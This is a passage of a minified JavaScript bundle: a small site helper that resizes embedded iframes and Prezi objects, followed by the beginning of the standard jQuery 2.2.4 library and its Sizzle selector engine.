/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */function makeIframesElastic(){$("iframe.google-viewer").each((function(){$(this).parents(".note-editable").length||$(this).attr("height",.65*$(this).width())})),$("iframe.video-frame").each((function(){$(this).parents(".note-editable").length||$(this).attr("height",.5625*$(this).width())})),$("iframe.scribd_iframe_embed").each((function(){$(this).parents(".note-editable").length||$(this).attr("height",.667*$(this).width())})),$("object.preziobject").each((function(){$(this).parents(".note-editable").length||$(this).attr("height",.5625*$(this).width())})),$("object.preziobject embed").each((function(){$(this).parents(".note-editable").length||$(this).attr("height",.5625*$(this).width())}))}!function(t,e){"object"==typeof module&&"object"==typeof module.exports?module.exports=t.document?e(t,!0):function(t){if(!t.document)throw new Error("jQuery requires a window with a document");return e(t)}:e(t)}("undefined"!=typeof window?window:this,(function(t,e){var i=[],a=t.document,o=i.slice,n=i.concat,r=i.push,s=i.indexOf,l={},c=l.toString,d=l.hasOwnProperty,p={},u="2.2.4",h=function(t,e){return new h.fn.init(t,e)},f=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,m=/^-ms-/,g=/-([\da-z])/gi,v=function(t,e){return e.toUpperCase()};function y(t){var e=!!t&&"length"in t&&t.length,i=h.type(t);return"function"!==i&&!h.isWindow(t)&&("array"===i||0===e||"number"==typeof e&&e>0&&e-1 in t)}h.fn=h.prototype={jquery:u,constructor:h,selector:"",length:0,toArray:function(){return o.call(this)},get:function(t){return null!=t?0>t?this[t+this.length]:this[t]:o.call(this)},pushStack:function(t){var e=h.merge(this.constructor(),t);return e.prevObject=this,e.context=this.context,e},each:function(t){return h.each(this,t)},map:function(t){return this.pushStack(h.map(this,(function(e,i){return t.call(e,i,e)})))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(t){var e=this.length,i=+t+(0>t?e:0);return this.pushStack(i>=0&&e>i?[this[i]]:[])},end:function(){return this.prevObject||this.constructor()},push:r,sort:i.sort,splice:i.splice},h.extend=h.fn.extend=function(){var t,e,i,a,o,n,r=arguments[0]||{},s=1,l=arguments.length,c=!1;for("boolean"==typeof r&&(c=r,r=arguments[s]||{},s++),"object"==typeof r||h.isFunction(r)||(r={}),s===l&&(r=this,s--);l>s;s++)if(null!=(t=arguments[s]))for(e in t)i=r[e],r!==(a=t[e])&&(c&&a&&(h.isPlainObject(a)||(o=h.isArray(a)))?(o?(o=!1,n=i&&h.isArray(i)?i:[]):n=i&&h.isPlainObject(i)?i:{},r[e]=h.extend(c,n,a)):void 0!==a&&(r[e]=a));return r},h.extend({expando:"jQuery"+(u+Math.random()).replace(/\D/g,""),isReady:!0,error:function(t){throw new Error(t)},noop:function(){},isFunction:function(t){return"function"===h.type(t)},isArray:Array.isArray,isWindow:function(t){return null!=t&&t===t.window},isNumeric:function(t){var e=t&&t.toString();return!h.isArray(t)&&e-parseFloat(e)+1>=0},isPlainObject:function(t){var e;if("object"!==h.type(t)||t.nodeType||h.isWindow(t))return!1;if(t.constructor&&!d.call(t,"constructor")&&!d.call(t.constructor.prototype||{},"isPrototypeOf"))return!1;for(e in t);return void 0===e||d.call(t,e)},isEmptyObject:function(t){var e;for(e in t)return!1;return!0},type:function(t){return null==t?t+"":"object"==typeof t||"function"==typeof t?l[c.call(t)]||"object":typeof t},globalEval:function(t){var e,i=eval;(t=h.trim(t))&&(1===t.indexOf("use strict")?((e=a.createElement("script")).text=t,a.head.appendChild(e).parentNode.removeChild(e)):i(t))},camelCase:function(t){return t.replace(m,"ms-").replace(g,v)},nodeName:function(t,e){return t.nodeName&&t.nodeName.toLowerCase()===e.toLowerCase()},each:function(t,e){var i,a=0;if(y(t))for(i=t.length;i>a&&!1!==e.call(t[a],a,t[a]);a++);else for(a in t)if(!1===e.call(t[a],a,t[a]))break;return t},trim:function(t){return null==t?"":(t+"").replace(f,"")},makeArray:function(t,e){var i=e||[];return null!=t&&(y(Object(t))?h.merge(i,"string"==typeof t?[t]:t):r.call(i,t)),i},inArray:function(t,e,i){return null==e?-1:s.call(e,t,i)},merge:function(t,e){for(var i=+e.length,a=0,o=t.length;i>a;a++)t[o++]=e[a];return t.length=o,t},grep:function(t,e,i){for(var a=[],o=0,n=t.length,r=!i;n>o;o++)!e(t[o],o)!==r&&a.push(t[o]);return a},map:function(t,e,i){var a,o,r=0,s=[];if(y(t))for(a=t.length;a>r;r++)null!=(o=e(t[r],r,i))&&s.push(o);else for(r in t)null!=(o=e(t[r],r,i))&&s.push(o);return n.apply([],s)},guid:1,proxy:function(t,e){var i,a,n;return"string"==typeof e&&(i=t[e],e=t,t=i),h.isFunction(t)?(a=o.call(arguments,2),(n=function(){return t.apply(e||this,a.concat(o.call(arguments)))}).guid=t.guid=t.guid||h.guid++,n):void 0},now:Date.now,support:p}),"function"==typeof Symbol&&(h.fn[Symbol.iterator]=i[Symbol.iterator]),h.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),(function(t,e){l["[object "+e+"]"]=e.toLowerCase()}));var $=function(t){var e,i,a,o,n,r,s,l,c,d,p,u,h,f,m,g,v,y,$,b="sizzle"+1*new Date,w=t.document,x=0,C=0,k=nt(),S=nt(),T=nt(),_=function(t,e){return t===e&&(p=!0),0},E=1<<31,D={}.hasOwnProperty,A=[],F=A.pop,O=A.push,M=A.push,N=A.slice,I=function(t,e){for(var i=0,a=t.length;a>i;i++)if(t[i]===e)return i;return-1},P="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",L="[\\x20\\t\\r\\n\\f]",j="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",R="\\["+L+"*("+j+")(?:"+L+"*([*^$|!~]?=)"+L+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+j+"))|)"+L+"*\\]",q=":("+j+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+R+")*)|.*)\\)|)",H=new RegExp(L+"+","g"),U=new RegExp("^"+L+"+|((?:^|[^\\\\])(?:\\\\.)*)"+L+"+$","g"),z=new RegExp("^"+L+"*,"+L+"*"),W=new RegExp("^"+L+"*([>+~]|"+L+")"+L+"*"),B=new RegExp("="+L+"*([^\\]'\"]*?)"+L+"*\\]","g"),V=new RegExp(q),J=new RegExp("^"+j+"$"),Q={ID:new RegExp("^#("+j+")"),CLASS:new RegExp("^\\.("+j+")"),TAG:new RegExp("^("+j+"|[*])"),ATTR:new RegExp("^"+R),PSEUDO:new RegExp("^"+q),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+L+"*(even|odd|(([+-]|)(\\d*)n|)"+L+"*(?:([+-]|)"+L+"*(\\d+)|))"+L+"*\\)|)","i"),bool:new RegExp("^(?:"+P+")$","i"),needsContext:new RegExp("^"+L+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+L+"*((?:-\\d)?\\d*)"+L+"*\\)|)(?=[^-]|$)","i")},G=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,Z=/^[^{]+\{\s*\[native \w/,X=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,K=/[+~]/,tt=/'|\\/g,et=new RegExp("\\\\([\\da-f]{1,6}"+L+"?|("+L+")|.)","ig"),it=function(t,e,i){var a="0x"+e-65536;return a!=a||i?e:0>a?String.fromCharCode(a+65536):String.fromCharCode(a>>10|55296,1023&a|56320)},at=function(){u()};try{M.apply(A=N.call(w.childNodes),w.childNodes),A[w.childNodes.length].nodeType}catch(t){M={apply:A.length?function(t,e){O.apply(t,N.call(e))}:function(t,e){for(var i=t.length,a=0;t[i++]=e[a++];);t.length=i-1}}}function ot(t,e,a,o){var n,s,c,d,p,f,v,y,x=e&&e.ownerDocument,C=e?e.nodeType:9;if(a=a||[],"string"!=typeof t||!t||1!==C&&9!==C&&11!==C)return a;if(!o&&((e?e.ownerDocument||e:w)!==h&&u(e),e=e||h,m)){if(11!==C&&(f=X.exec(t)))if(n=f[1]){if(9===C){if(!(c=e.getElementById(n)))return a;if(c.id===n)return a.push(c),a}else if(x&&(c=x.getElementById(n))&&$(e,c)&&c.id===n)return a.push(c),a}else{if(f[2])return M.apply(a,e.getElementsByTagName(t)),a;if((n=f[3])&&i.getElementsByClassName&&e.getElementsByClassName)return M.apply(a,e.getElementsByClassName(n)),a}if(i.qsa&&!T[t+" "]&&(!g||!g.test(t))){if(1!==C)x=e,y=t;else if("object"!==e.nodeName.toLowerCase()){for((d=e.getAttribute("id"))?d=d.replace(tt,"\\$&"):e.setAttribute("id",d=b),s=(v=r(t)).length,p=J.test(d)?"#"+d:"[id='"+d+"']";s--;)v[s]=p+" "+mt(v[s]);y=v.join(","),x=K.test(t)&&ht(e.parentNode)||e}if(y)try{return M.apply(a,x.querySelectorAll(y)),a}catch(t){}finally{d===b&&e.removeAttribute("id")}}}return l(t.replace(U,"$1"),e,a,o)}function nt(){var t=[];return function e(i,o){return t.push(i+" ")>a.cacheLength&&delete e[t.shift()],e[i+" "]=o}}function rt(t){return t[b]=!0,t}function st(t){var e=h.createElement("div");try{return!!t(e)}catch(t){return!1}finally{e.parentNode&&e.parentNode.removeChild(e),e=null}}function lt(t,e){for(var i=t.split("|"),o=i.length;o--;)a.attrHandle[i[o]]=e}function ct(t,e){var i=e&&t,a=i&&1===t.nodeType&&1===e.nodeType&&(~e.sourceIndex||E)-(~t.sourceIndex||E);if(a)return a;if(i)for(;i=i.nextSibling;)if(i===e)return-1;return t?1:-1}function dt(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function pt(t){return function(e){var i=e.nodeName.toLowerCase();return("input"===i||"button"===i)&&e.type===t}}function ut(t){return rt((function(e){return e=+e,rt((function(i,a){for(var o,n=t([],i.length,e),r=n.length;r--;)i[o=n[r]]&&(i[o]=!(a[o]=i[o]))}))}))}function ht(t){return t&&void 0!==t.getElementsByTagName&&t}for(e in i=ot.support={},n=ot.isXML=function(t){var e=t&&(t.ownerDocument||t).documentElement;return!!e&&"HTML"!==e.nodeName},u=ot.setDocument=function(t){var e,o,r=t?t.ownerDocument||t:w;return r!==h&&9===r.nodeType&&r.documentElement?(f=(h=r).documentElement,m=!n(h),(o=h.defaultView)&&o.top!==o&&(o.addEventListener?o.addEventListener("unload",at,!1):o.attachEvent&&o.attachEvent("onunload",at)),i.attributes=st((function(t){return t.className="i",!t.getAttribute("className")})),i.getElementsByTagName=st((function(t){return t.appendChild(h.createComment("")),!t.getElementsByTagName("*").length})),i.getElementsByClassName=Z.test(h.getElementsByClassName),i.getById=st((function(t){return f.appendChild(t).id=b,!h.getElementsByName||!h.getElementsByName(b).length})),i.getById?(a.find.ID=function(t,e){if(void 0!==e.getElementById&&m){var i=e.getElementById(t);return i?[i]:[]}},a.filter.ID=function(t){var e=t.replace(et,it);return function(t){return t.getAttribute("id")===e}}):(delete a.find.ID,a.filter.ID=function(t){var e=t.replace(et,it);return function(t){var i=void 0!==t.getAttributeNode&&t.getAttributeNode("id");return i&&i.value===e}}),a.find.TAG=i.getElementsByTagName?function(t,e){return void 0!==e.getElementsByTagName?e.getElementsByTagName(t):i.qsa?e.querySelectorAll(t):void 0}:function(t,e){var i,a=[],o=0,n=e.getElementsByTagName(t);if("*"===t){for(;i=n[o++];)1===i.nodeType&&a.push(i);return a}return n},a.find.CLASS=i.getElementsByClassName&&function(t,e){return void 0!==e.getElementsByClassName&&m?e.getElementsByClassName(t):void 0},v=[],g=[],(i.qsa=Z.test(h.querySelectorAll))&&(st((function(t){f.appendChild(t).innerHTML="<a id='"+b+"'></a><select id='"+b+"-\r\\' msallowcapture=''><option selected=''></option></select>",t.querySelectorAll("[msallowcapture^='']").length&&g.push("[*^$]="+L+"*(?:''|\"\")"),t.querySelectorAll("[selected]").length||g.push("\\["+L+"*(?:value|"+P+")"),t.querySelectorAll("[id~="+b+"-]").length||g.push("~="),t.querySelectorAll(":checked").length||g.push(":checked"),t.querySelectorAll("a#"+b+"+*").length||g.push(".#.+[+~]")})),st((function(t){var e=h.createElement("input");e.setAttribute("type","hidden"),t.appendChild(e).setAttribute("name","D"),t.querySelectorAll("[name=d]").length&&g.push("name"+L+"*[*^$|!~]?="),t.querySelectorAll(":enabled").length||g.push(":enabled",":disabled"),t.querySelectorAll("*,:x"),g.push(",.*:")}))),(i.matchesSelector=Z.test(y=f.matches||f.webkitMatchesSelector||f.mozMatchesSelector||f.oMatchesSelector||f.msMatchesSelector))&&st((function(t){i.disconnectedMatch=y.call(t,"div"),y.call(t,"[s!='']:x"),v.push("!=",q)})),g=g.length&&new RegExp(g.join("|")),v=v.length&&new RegExp(v.join("|")),e=Z.test(f.compareDocumentPosition),$=e||Z.test(f.contains)?function(t,e){var i=9===t.nodeType?t.documentElement:t,a=e&&e.parentNode;return t===a||!(!a||1!==a.nodeType||!(i.contains?i.contains(a):t.compareDocumentPosition&&16&t.compareDocumentPosition(a)))}:function(t,e){if(e)for(;e=e.parentNode;)if(e===t)return!0;return!1},_=e?function(t,e){if(t===e)return p=!0,0;var a=!t.compareDocumentPosition-!e.compareDocumentPosition;return a||(1&(a=(t.ownerDocument||t)===(e.ownerDocument||e)?t.compareDocumentPosition(e):1)||!i.sortDetached&&e.compareDocumentPosition(t)===a?t===h||t.ownerDocument===w&&$(w,t)?-1:e===h||e.ownerDocument===w&&$(w,e)?1:d?I(d,t)-I(d,e):0:4&a?-1:1)}:function(t,e){if(t===e)return p=!0,0;var i,a=0,o=t.parentNode,n=e.parentNode,r=[t],s=[e];if(!o||!n)return t===h?-1:e===h?1:o?-1:n?1:d?I(d,t)-I(d,e):0;if(o===n)return ct(t,e);for(i=t;i=i.parentNode;)r.unshift(i);for(i=e;i=i.parentNode;)s.unshift(i);for(;r[a]===s[a];)a++;return a?ct(r[a],s[a]):r[a]===w?-1:s[a]===w?1:0},h):h},ot.matches=function(t,e){return ot(t,null,null,e)},ot.matchesSelector=function(t,e){if((t.ownerDocument||t)!==h&&u(t),e=e.replace(B,"='$1']"),i.matchesSelector&&m&&!T[e+" "]&&(!v||!v.test(e))&&(!g||!g.test(e)))try{var a=y.call(t,e);if(a||i.disconnectedMatch||t.document&&11!==t.document.nodeType)return a}catch(t){}return ot(e,h,null,[t]).length>0},ot.contains=function(t,e){return(t.ownerDocument||t)!==h&&u(t),$(t,e)},ot.attr=function(t,e){(t.ownerDocument||t)!==h&&u(t);var o=a.attrHandle[e.toLowerCase()],n=o&&D.call(a.attrHandle,e.toLowerCase())?o(t,e,!m):void 0;return void 0!==n?n:i.attributes||!m?t.getAttribute(e):(n=t.getAttributeNode(e))&&n.specified?n.value:null},ot.error=function(t){throw new Error("Syntax error, unrecognized expression: "+t)},ot.uniqueSort=function(t){var e,a=[],o=0,n=0;if(p=!i.detectDuplicates,d=!i.sortStable&&t.slice(0),t.sort(_),p){for(;e=t[n++];)e===t[n]&&(o=a.push(n));for(;o--;)t.splice(a[o],1)}return d=null,t},o=ot.getText=function(t){var e,i="",a=0,n=t.nodeType;if(n){if(1===n||9===n||11===n){if("string"==typeof t.textContent)return t.textContent;for(t=t.firstChild;t;t=t.nextSibling)i+=o(t)}else if(3===n||4===n)return t.nodeValue}else for(;e=t[a++];)i+=o(e);return i},(a=ot.selectors={cacheLength:50,createPseudo:rt,match:Q,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(t){return t[1]=t[1].replace(et,it),t[3]=(t[3]||t[4]||t[5]||"").replace(et,it),"~="===t[2]&&(t[3]=" "+t[3]+" "),t.slice(0,4)},CHILD:function(t){return t[1]=t[1].toLowerCase(),"nth"===t[1].slice(0,3)?(t[3]||ot.error(t[0]),t[4]=+(t[4]?t[5]+(t[6]||1):2*("even"===t[3]||"odd"===t[3])),t[5]=+(t[7]+t[8]||"odd"===t[3])):t[3]&&ot.error(t[0]),t},PSEUDO:function(t){var e,i=!t[6]&&t[2];return Q.CHILD.test(t[0])?null:(t[3]?t[2]=t[4]||t[5]||"":i&&V.test(i)&&(e=r(i,!0))&&(e=i.indexOf(")",i.length-e)-i.length)&&(t[0]=t[0].slice(0,e),t[2]=i.slice(0,e)),t.slice(0,3))}},filter:{TAG:function(t){var e=t.replace(et,it).toLowerCase();return"*"===t?function(){return!0}:function(t){return t.nodeName&&t.nodeName.toLowerCase()===e}},CLASS:function(t){var e=k[t+" "];return e||(e=new RegExp("(^|"+L+")"+t+"("+L+"|$)"))&&k(t,(function(t){return e.test("string"==typeof t.className&&t.className||void 0!==t.getAttribute&&t.getAttribute("class")||"")}))},ATTR:function(t,e,i){return function(a){var o=ot.attr(a,t);return null==o?"!="===e:!e||(o+="","="===e?o===i:"!="===e?o!==i:"^="===e?i&&0===o.indexOf(i):"*="===e?i&&o.indexOf(i)>-1:"$="===e?i&&o.slice(-i.length)===i:"~="===e?(" "+o.replace(H," ")+" ").indexOf(i)>-1:"|="===e&&(o===i||o.slice(0,i.length+1)===i+"-"))}},CHILD:function(t,e,i,a,o){var n="nth"!==t.slice(0,3),r="last"!==t.slice(-4),s="of-type"===e;return 1===a&&0===o?function(t){return!!t.parentNode}:function(e,i,l){var c,d,p,u,h,f,m=n!==r?"nextSibling":"previousSibling",g=e.parentNode,v=s&&e.nodeName.toLowerCase(),y=!l&&!s,$=!1;if(g){if(n){for(;m;){for(u=e;u=u[m];)if(s?u.nodeName.toLowerCase()===v:1===u.nodeType)return!1;f=m="only"===t&&!f&&"nextSibling"}return!0}if(f=[r?g.firstChild:g.lastChild],r&&y){for($=(h=(c=(d=(p=(u=g)[b]||(u[b]={}))[u.uniqueID]||(p[u.uniqueID]={}))[t]||[])[0]===x&&c[1])&&c[2],u=h&&g.childNodes[h];u=++h&&u&&u[m]||($=h=0)||f.pop();)if(1===u.nodeType&&++$&&u===e){d[t]=[x,h,$];break}}else if(y&&($=h=(c=(d=(p=(u=e)[b]||(u[b]={}))[u.uniqueID]||(p[u.uniqueID]={}))[t]||[])[0]===x&&c[1]),!1===$)for(;(u=++h&&u&&u[m]||($=h=0)||f.pop())&&((s?u.nodeName.toLowerCase()!==v:1!==u.nodeType)||!++$||(y&&((d=(p=u[b]||(u[b]={}))[u.uniqueID]||(p[u.uniqueID]={}))[t]=[x,$]),u!==e)););return($-=o)===a||$%a==0&&$/a>=0}}},PSEUDO:function(t,e){var i,o=a.pseudos[t]||a.setFilters[t.toLowerCase()]||ot.error("unsupported pseudo: "+t);return o[b]?o(e):o.length>1?(i=[t,t,"",e],a.setFilters.hasOwnProperty(t.toLowerCase())?rt((function(t,i){for(var a,n=o(t,e),r=n.length;r--;)t[a=I(t,n[r])]=!(i[a]=n[r])})):function(t){return o(t,0,i)}):o}},pseudos:{not:rt((function(t){var e=[],i=[],a=s(t.replace(U,"$1"));return a[b]?rt((function(t,e,i,o){for(var n,r=a(t,null,o,[]),s=t.length;s--;)(n=r[s])&&(t[s]=!(e[s]=n))})):function(t,o,n){return e[0]=t,a(e,null,n,i),e[0]=null,!i.pop()}})),has:rt((function(t){return function(e){return ot(t,e).length>0}})),contains:rt((function(t){return t=t.replace(et,it),function(e){return(e.textContent||e.innerText||o(e)).indexOf(t)>-1}})),lang:rt((function(t){return J.test(t||"")||ot.error("unsupported lang: "+t),t=t.replace(et,it).toLowerCase(),function(e){var i;do{if(i=m?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(i=i.toLowerCase())===t||0===i.indexOf(t+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}})),target:function(e){var i=t.location&&t.location.hash;return i&&i.slice(1)===e.id},root:function(t){return t===f},focus:function(t){return t===h.activeElement&&(!h.hasFocus||h.hasFocus())&&!!(t.type||t.href||~t.tabIndex)},enabled:function(t){return!1===t.disabled},disabled:function(t){return!0===t.disabled},checked:function(t){var e=t.nodeName.toLowerCase();return"input"===e&&!!t.checked||"option"===e&&!!t.selected},selected:function(t){return t.parentNode&&t.parentNode.selectedIndex,!0===t.selected},empty:function(t){for(t=t.firstChild;t;t=t.nextSibling)if(t.nodeType<6)return!1;return!0},parent:function(t){return!a.pseudos.empty(t)},header:function(t){return Y.test(t.nodeName)},input:function(t){return G.test(t.nodeName)},button:function(t){var e=t.nodeName.toLowerCase();return"input"===e&&"button"===t.type||"button"===e},text:function(t){var e;return"input"===t.nodeName.toLowerCase()&&"text"===t.type&&(null==(e=t.getAttribute("type"))||"text"===e.toLowerCase())},first:ut((function(){return[0]})),last:ut((function(t,e){return[e-1]})),eq:ut((function(t,e,i){return[0>i?i+e:i]})),even:ut((function(t,e){for(var i=0;e>i;i+=2)t.push(i);return t})),odd:ut((function(t,e){for(var i=1;e>i;i+=2)t.push(i);return t})),lt:ut((function(t,e,i){for(var a=0>i?i+e:i;--a>=0;)t.push(a);return t})),gt:ut((function(t,e,i){for(var a=0>i?i+e:i;++a<e;)t.push(a);return t}))}}).pseudos.nth=a.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})a.pseudos[e]=dt(e);for(e in{submit:!0,reset:!0})a.pseudos[e]=pt(e);function ft(){}function mt(t){for(var e=0,i=t.length,a="";i>e;e++)a+=t[e].value;return a}function gt(t,e,i){var a=e.dir,o=i&&"parentNode"===a,n=C++;return e.first?function(e,i,n){for(;e=e[a];)if(1===e.nodeType||o)return t(e,i,n)}:function(e,i,r){var s,l,c,d=[x,n];if(r){for(;e=e[a];)if((1===e.nodeType||o)&&t(e,i,r))return!0}else for(;e=e[a];)if(1===e.nodeType||o){if((s=(l=(c=e[b]||(e[b]={}))[e.uniqueID]||(c[e.uniqueID]={}))[a])&&s[0]===x&&s[1]===n)return d[2]=s[2];if(l[a]=d,d[2]=t(e,i,r))return!0}}}function vt(t){return t.length>1?function(e,i,a){for(var o=t.length;o--;)if(!t[o](e,i,a))return!1;return!0}:t[0]}function yt(t,e,i,a,o){for(var n,r=[],s=0,l=t.length,c=null!=e;l>s;s++)(n=t[s])&&(i&&!i(n,a,o)||(r.push(n),c&&e.push(s)));return r}function $t(t,e,i,a,o,n){return a&&!a[b]&&(a=$t(a)),o&&!o[b]&&(o=$t(o,n)),rt((function(n,r,s,l){var c,d,p,u=[],h=[],f=r.length,m=n||function(t,e,i){for(var a=0,o=e.length;o>a;a++)ot(t,e[a],i);return i}(e||"*",s.nodeType?[s]:s,[]),g=!t||!n&&e?m:yt(m,u,t,s,l),v=i?o||(n?t:f||a)?[]:r:g;if(i&&i(g,v,s,l),a)for(c=yt(v,h),a(c,[],s,l),d=c.length;d--;)(p=c[d])&&(v[h[d]]=!(g[h[d]]=p));if(n){if(o||t){if(o){for(c=[],d=v.length;d--;)(p=v[d])&&c.push(g[d]=p);o(null,v=[],c,l)}for(d=v.length;d--;)(p=v[d])&&(c=o?I(n,p):u[d])>-1&&(n[c]=!(r[c]=p))}}else v=yt(v===r?v.splice(f,v.length):v),o?o(null,r,v,l):M.apply(r,v)}))}function bt(t){for(var e,i,o,n=t.length,r=a.relative[t[0].type],s=r||a.relative[" "],l=r?1:0,d=gt((function(t){return t===e}),s,!0),p=gt((function(t){return I(e,t)>-1}),s,!0),u=[function(t,i,a){var o=!r&&(a||i!==c)||((e=i).nodeType?d(t,i,a):p(t,i,a));return e=null,o}];n>l;l++)if(i=a.relative[t[l].type])u=[gt(vt(u),i)];else{if((i=a.filter[t[l].type].apply(null,t[l].matches))[b]){for(o=++l;n>o&&!a.relative[t[o].type];o++);return $t(l>1&&vt(u),l>1&&mt(t.slice(0,l-1).concat({value:" "===t[l-2].type?"*":""})).replace(U,"$1"),i,o>l&&bt(t.slice(l,o)),n>o&&bt(t=t.slice(o)),n>o&&mt(t))}u.push(i)}return vt(u)}function wt(t,e){var i=e.length>0,o=t.length>0,n=function(n,r,s,l,d){var p,f,g,v=0,y="0",$=n&&[],b=[],w=c,C=n||o&&a.find.TAG("*",d),k=x+=null==w?1:Math.random()||.1,S=C.length;for(d&&(c=r===h||r||d);y!==S&&null!=(p=C[y]);y++){if(o&&p){for(f=0,r||p.ownerDocument===h||(u(p),s=!m);g=t[f++];)if(g(p,r||h,s)){l.push(p);break}d&&(x=k)}i&&((p=!g&&p)&&v--,n&&$.push(p))}if(v+=y,i&&y!==v){for(f=0;g=e[f++];)g($,b,r,s);if(n){if(v>0)for(;y--;)$[y]||b[y]||(b[y]=F.call(l));b=yt(b)}M.apply(l,b),d&&!n&&b.length>0&&v+e.length>1&&ot.uniqueSort(l)}return d&&(x=k,c=w),$};return i?rt(n):n}return ft.prototype=a.filters=a.pseudos,a.setFilters=new ft,r=ot.tokenize=function(t,e){var i,o,n,r,s,l,c,d=S[t+" "];if(d)return e?0:d.slice(0);for(s=t,l=[],c=a.preFilter;s;){for(r in i&&!(o=z.exec(s))||(o&&(s=s.slice(o[0].length)||s),l.push(n=[])),i=!1,(o=W.exec(s))&&(i=o.shift(),n.push({value:i,type:o[0].replace(U," ")}),s=s.slice(i.length)),a.filter)!(o=Q[r].exec(s))||c[r]&&!(o=c[r](o))||(i=o.shift(),n.push({value:i,type:r,matches:o}),s=s.slice(i.length));if(!i)break}return e?s.length:s?ot.error(t):S(t,l).slice(0)},s=ot.compile=function(t,e){var i,a=[],o=[],n=T[t+" "];if(!n){for(e||(e=r(t)),i=e.length;i--;)(n=bt(e[i]))[b]?a.push(n):o.push(n);(n=T(t,wt(o,a))).selector=t}return n},l=ot.select=function(t,e,o,n){var l,c,d,p,u,h="function"==typeof t&&t,f=!n&&r(t=h.selector||t);if(o=o||[],1===f.length){if((c=f[0]=f[0].slice(0)).length>2&&"ID"===(d=c[0]).type&&i.getById&&9===e.nodeType&&m&&a.relative[c[1].type]){if(!(e=(a.find.ID(d.matches[0].replace(et,it),e)||[])[0]))return o;h&&(e=e.parentNode),t=t.slice(c.shift().value.length)}for(l=Q.needsContext.test(t)?0:c.length;l--&&(d=c[l],!a.relative[p=d.type]);)if((u=a.find[p])&&(n=u(d.matches[0].replace(et,it),K.test(c[0].type)&&ht(e.parentNode)||e))){if(c.splice(l,1),!(t=n.length&&mt(c)))return M.apply(o,n),o;break}}return(h||s(t,f))(n,e,!m,o,!e||K.test(t)&&ht(e.parentNode)||e),o},i.sortStable=b.split("").sort(_).join("")===b,i.detectDuplicates=!!p,u(),i.sortDetached=st((function(t){return 1&t.compareDocumentPosition(h.createElement("div"))})),st((function(t){return t.innerHTML="<a href='#'></a>","#"===t.firstChild.getAttribute("href")}))||lt("type|href|height|width",(function(t,e,i){return i?void 0:t.getAttribute(e,"type"===e.toLowerCase()?1:2)})),i.attributes&&st((function(t){return t.innerHTML="<input/>",t.firstChild.setAttribute("value",""),""===t.firstChild.getAttribute("value")}))||lt("value",(function(t,e,i){return i||"input"!==t.nodeName.toLowerCase()?void 0:t.defaultValue})),st((function(t){return null==t.getAttribute("disabled")}))||lt(P,(function(t,e,i){var a;return i?void 0:!0===t[e]?e.toLowerCase():(a=t.getAttributeNode(e))&&a.specified?a.value:null})),ot}(t);h.find=$,h.expr=$.selectors,h.expr[":"]=h.expr.pseudos,h.uniqueSort=h.unique=$.uniqueSort,h.text=$.getText,h.isXMLDoc=$.isXML,h.contains=$.contains;var b=function(t,e,i){for(var a=[],o=void 0!==i;(t=t[e])&&9!==t.nodeType;)if(1===t.nodeType){if(o&&h(t).is(i))break;a.push(t)}return a},w=function(t,e){for(var i=[];t;t=t.nextSibling)1===t.nodeType&&t!==e&&i.push(t);return i},x=h.expr.match.needsContext,C=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,k=/^.[^:#\[\.,]*$/;function S(t,e,i){if(h.isFunction(e))return h.grep(t,(function(t,a){return!!e.call(t,a,t)!==i}));if(e.nodeType)return h.grep(t,(function(t){return t===e!==i}));if("string"==typeof e){if(k.test(e))return h.filter(e,t,i);e=h.filter(e,t)}return h.grep(t,(function(t){return s.call(e,t)>-1!==i}))}h.filter=function(t,e,i){var a=e[0];return i&&(t=":not("+t+")"),1===e.length&&1===a.nodeType?h.find.matchesSelector(a,t)?[a]:[]:h.find.matches(t,h.grep(e,(function(t){return 1===t.nodeType})))},h.fn.extend({find:function(t){var e,i=this.length,a=[],o=this;if("string"!=typeof t)return this.pushStack(h(t).filter((function(){for(e=0;i>e;e++)if(h.contains(o[e],this))return!0})));for(e=0;i>e;e++)h.find(t,o[e],a);return(a=this.pushStack(i>1?h.unique(a):a)).selector=this.selector?this.selector+" "+t:t,a},filter:function(t){return this.pushStack(S(this,t||[],!1))},not:function(t){return this.pushStack(S(this,t||[],!0))},is:function(t){return!!S(this,"string"==typeof t&&x.test(t)?h(t):t||[],!1).length}});var T,_=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;(h.fn.init=function(t,e,i){var o,n;if(!t)return this;if(i=i||T,"string"==typeof t){if(!(o="<"===t[0]&&">"===t[t.length-1]&&t.length>=3?[null,t,null]:_.exec(t))||!o[1]&&e)return!e||e.jquery?(e||i).find(t):this.constructor(e).find(t);if(o[1]){if(e=e instanceof h?e[0]:e,h.merge(this,h.parseHTML(o[1],e&&e.nodeType?e.ownerDocument||e:a,!0)),C.test(o[1])&&h.isPlainObject(e))for(o in e)h.isFunction(this[o])?this[o](e[o]):this.attr(o,e[o]);return this}return(n=a.getElementById(o[2]))&&n.parentNode&&(this.length=1,this[0]=n),this.context=a,this.selector=t,this}return t.nodeType?(this.context=this[0]=t,this.length=1,this):h.isFunction(t)?void 0!==i.ready?i.ready(t):t(h):(void 0!==t.selector&&(this.selector=t.selector,this.context=t.context),h.makeArray(t,this))}).prototype=h.fn,T=h(a);var 